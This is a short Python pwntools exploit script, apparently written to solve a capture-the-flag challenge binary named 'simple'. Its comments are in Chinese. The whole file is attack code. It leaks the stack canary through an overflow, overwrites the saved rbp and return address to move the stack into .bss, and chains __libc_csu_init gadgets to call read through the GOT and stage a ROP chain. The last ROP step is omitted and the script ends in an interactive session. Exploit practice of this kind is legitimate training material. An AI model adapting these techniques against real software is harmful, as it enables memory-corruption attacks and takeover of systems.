from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

elf = ELF('./simple')
bss = elf.bss()
r = process('./simple')


# leak canary
r.sendafter(':', 'a'*0x18+'x')
r.recvuntil('x')
canary = u64(b'\x00' + r.recvn(7))
print("canary = ", hex(canary))

second_read = 0x0000000000401243
leave = 0x0000000000401272
# overwrite rbp and back to second read
r.sendafter(':', b'a'*0x18+flat(canary, bss+0x800, second_read))

# stack migration
# leave 讓 rsp 跳到 bss+0x800-0x20 (就是下方開頭位址) 然後 pop_rbp (bss+0x800+0x8 可以讓等等 read 的位址從 read 的 ra 開始寫) 接著 ret 到 second_read

r.send(flat(bss+0x800+0x8, second_read, 0xcafebabe, canary, bss+0x800-0x20, leave))

# 跳 libc_csu_init 設定參數 (給 6 個 gadget 大小就是為了這個地方)
__libc_csu_init1 = 0x00000000004012dc
__libc_csu_init2 = 0x00000000004012c0
gdb.attach(r)
rbx = 0x401280
read_got = elf.symbols['got.read']
# rsi 基本上就填 ret 位址
#                            edi        rsi      rdx             r15 ( call [r15+rbx*8] r15 要填多少用 gdb 觀察 )
r.send(flat(__libc_csu_init1,  0,  bss+0x810, 0x1000, read_got-rbx*8, __libc_csu_init2))
# 接下來就是簡單的 rop 了 (略)


r.interactive()

